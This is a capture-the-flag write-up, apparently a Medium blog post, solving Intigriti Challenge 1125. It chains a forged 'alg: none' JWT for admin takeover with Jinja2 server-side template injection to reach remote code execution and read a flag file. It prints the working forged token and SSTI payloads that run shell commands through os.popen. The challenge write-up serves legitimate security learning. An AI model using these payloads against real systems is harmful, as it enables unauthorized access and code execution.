# Intigriti Challenge 1125 — JWT Confusion to SSTI → RCE (My Fastest CTF Solve Ever)

- **Source URL:** https://savi0r.medium.com/intigriti-challenge-1125-jwt-confusion-to-ssti-rce-my-fastest-ctf-solve-ever-43d43df4182c?source=rss------bug_bounty-5
- **Fetched from:** https://savi0r.medium.com/feed
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 11730)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### 🔥 Intigriti Challenge 1125 — JWT Confusion to SSTI → RCE (My Fastest CTF Solve Ever)

**By: savi0r**

**Date: November 2025**

**Duration: \~3 hours**

**Result: Full Solve (JWT Admin Takeover → SSTI → RCE → Flag)**

**Status: ✅ Completed**

### 🧠 Preface

Honestly, this challenge was pretty easy. I solved it in about 2–3 hours, literally on the last day before the deadline (18–24 November). No stress, no overthinking, no getting stuck for days. It was a smooth chain from start to finish. And that’s a huge contrast to my previous CTF, which took me 5 days and way more energy than I expected. If you’re curious, the writeup for that one is available too. But yeah — 1125 felt simple, and it really showed me how much faster and more confident I’ve become since then.

MY PREVIOUS WRITEUP:

[https://medium.com/@savi0r/intigriti-challenge-1025-unintended-solution-writeup-92ac5c9d425e](https://medium.com/@savi0r/intigriti-challenge-1025-unintended-solution-writeup-92ac5c9d425e)

### 📋 TL;DR (for the impatient)

- Intercept login → see JWT
- JWT uses HS256 → swap to alg:none → forge admin token
- Access admin panel
- Find SSTI in display\_name
- Escape Jinja2 sandbox → Python RCE
- Enumerate /app
- Find hidden .aquacommerce/019a82cf.txt
- Cat it → flag obtained

Simple chain. Clean execution.

Exactly the kind of challenge that makes you love hacking.

### 🎯 Challenge Overview

The challenge presented a fictional e-commerce platform called “AquaCommerce” with standard user registration, login, and an admin panel. The goal was to find and exploit vulnerabilities to retrieve the flag in the format INTIGRITI{.\*}.

### 🔍 Phase 1: Reconnaissance

### Initial Access

After registering a standard user account, I intercepted the HTTP traffic using Burp Suite and noticed something immediately interesting in the response:

Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjQsInVzZXJuYW1lIjoic2F2aTFyIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjQwNzM0NzZ9.onNFvXHSYvrIrqUCOpRaI8qKSlcS8cj-B6hVKcZAHvQ

A JWT token! This was my entry point.

### JWT Analysis

Using jwt.io (or manual base64 decoding), I decoded the token:

**Header:**

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
**Payload:**

```
{
  "user_id": 124,
  "username": "savi1r",
  "role": "user",
  "exp": 1764073476
}
```
The presence of a role field immediately suggested privilege escalation potential. The question was: **Does the server properly validate the JWT signature?**

### 💥 Phase 2: JWT Algorithm Confusion Attack

### The Vulnerability

JWT tokens can be signed using different algorithms specified in the header. A classic vulnerability occurs when servers accept the "alg": "none" algorithm, which means **no signature verification is required**.

### Exploitation Steps

**1. Modify the Header**

Changed the algorithm from HS256 to none:

```
{
  "alg": "none",
  "typ": "JWT"
}
```
**2. Forge the Payload**

To impersonate the admin, I needed to guess the correct admin credentials. Standard practice suggests:

- user\_id: 1 (first user in database)
- username: "admin"
- role: "admin"

Modified payload:

```
{
  "user_id": 1,
  "username": "admin",
  "role": "admin",
  "exp": 1764073476
}
```
**3. Reconstruct the Token**

Base64url encode both parts and combine them:

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzY0MDczNDc2fQ.

⚠️ **CRITICAL:** Notice the trailing dot (.) at the end. This is essential! The JWT format requires three parts separated by dots: header.payload.signature. When using the none algorithm, the signature is empty, but the structure must remain: header.payload.

**Without the trailing dot, the server will reject the token immediately.**

### Result

After replacing my cookie with the forged token:

Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzY0MDczNDc2fQ.

I refreshed the page and successfully gained access to the **Admin Dashboard**. 🎉

### 🎯 Phase 3: Discovering SSTI

### Admin Panel Enumeration

Inside the admin panel, I found three main sections:

- User Management (buttons disabled)
- Orders Management (buttons disabled)
- Products Management (buttons disabled)

However, there was an accessible feature: **Admin Profile** at /admin/profile.

### The Profile Update Feature

The profile page allowed updating a display\_name field:

POST /admin/profile HTTP/1.1

Host: challenge-1125.intigriti.io

Cookie: token=eyJhbGciOiJub25lIi...

display\_name=test\_user

This field was reflected on the page, making it a prime candidate for injection attacks.

### Testing for SSTI

I injected a classic template engine test payload:

`{{7*7}}`
**Result:** The page displayed 49 instead of the literal string {{7\*7}}!

This confirmed **Server-Side Template Injection**, likely using Python’s Jinja2 template engine.

### 🔓 Phase 4: Escalating to RCE

### Understanding the Attack Surface

Jinja2 allows accessing Python objects through template syntax. The goal was to:

1. Access Python’s built-in functions
2. Import the os module
3. Execute system commands

### The Payload

I crafted the following payload to achieve Remote Code Execution:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
**Breakdown:**

- self.\_\_init\_\_ - Access the class constructor
- \_\_globals\_\_ - Access the global namespace
- \_\_builtins\_\_ - Access Python's built-in functions
- \_\_import\_\_('os') - Dynamically import the OS module
- popen('id') - Execute the id command
- .read() - Read the command output

### Verification

http

POST /admin/profile HTTP/1.1

`display_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
**Response:**

uid=0(root) gid=0(root) groups=0(root)

**Remote Code Execution achieved!** ✅

### 🚩 Phase 5: Finding and Extracting the Flag

### File System Enumeration

First, I explored the application directory:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /app').read() }}`
**Output:**

drwxr-xr-x  .aquacommerce/

-rw-r--r-- app.py

-rw-r--r-- requirements.txt

...

The hidden directory .aquacommerce looked suspicious!

### Exploring the Hidden Directory

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /app/.aquacommerce').read() }}`
**Output:**

019a82cf.txt

Found it! 🎯

### Final Payload:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/.aquacommerce/019a82cf.txt').read() }}`
### The Flag:

`INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}`
**Challenge solved!** 🏆

### 📝 Complete Solution Summary

### Payloads Used

**1. JWT Bypass:**

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzY0MDczNDc2fQ.

**2. SSTI to RCE:**

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/.aquacommerce/019a82cf.txt').read() }}`
### Steps to Reproduce

1. Register a user account
2. Decode the JWT token
3. Forge a new JWT with "alg": "none", user\_id: 1, and role: "admin"
4. Replace your token cookie (don’t forget the trailing dot!)
5. Access /admin/profile
6. Test for SSTI with {{7\*7}}
7. Execute RCE payload to find the flag
8. Read /app/.aquacommerce/019a82cf.txt

### 🎓 Resources

- [JWT.io](https://jwt.io) — JWT decoder and debugger
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt) — Comprehensive JWT security guide
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) — SSTI exploitation techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — SSTI payload collection

### 🧠 What Made This Challenge Fast for Me?

Unlike my previous **5-day struggle** on Challenge 1025 (SSRF),

this one was almost a **sprint**.

**Why?**

✅ I already knew JWT confusion attacks

✅ I already practiced SSTI → RCE chains

✅ I’m comfortable using Burp quickly

✅ Template breakout is familiar territory

✅ File enumeration is straightforward with popen

✅ There was **no deep rabbit hole**, unlike SSRF

This was the first time I felt like I was **actually fast**, not guessing.

### 📚 Lessons Learned

Even if this challenge was “easy” by red-team standards, it still taught me a few things:

### ✔ Pay attention to tiny formatting details

Like **the trailing dot** in JWT. That alone breaks or makes the exploit.

### ✔ Knowing common injection primitives saves time

{{7\*7}} → this **one line** confirmed the whole second part of the challenge.

### ✔ Don’t trust “user\_id” or “role” inside JWT

Always try forging one.

### ✔ SSTI → RCE is extremely powerful

Template engines are dangerous when misused.

### 🎯 Skills Gained / Reinforced

- JWT Analysis & Forgery
- Role escalation
- Jinja2 SSTI exploitation
- Python RCE
- File enumeration
- Fast vulnerability chaining
- Effective use of Burp suite
- Payload encoding

### 💭 Final Thoughts

This challenge was the **opposite** of my previous one:

❌ No fever

❌ No 5-day burnout

❌ No dead ends

❌ No frustrations

✅ Just pure **flow-state hacking.**

For the first time, I felt like everything **clicked**:

I chained JWT → SSTI → RCE → Flag in under **3 hours**.

As a teenager still learning cybersecurity,

this was a **huge confidence boost.**I’ll keep grinding, learning, solving, and documenting my journey.

**See you in the next challenge.**

### 🙏 Acknowledgments

- **Intigriti** — for another amazing challenge
- **The community** — for being inspiring as always
- **Myself** — for not giving up

*If this writeup helped you or inspired you, drop a clap! 👏 Let’s keep learning together.*
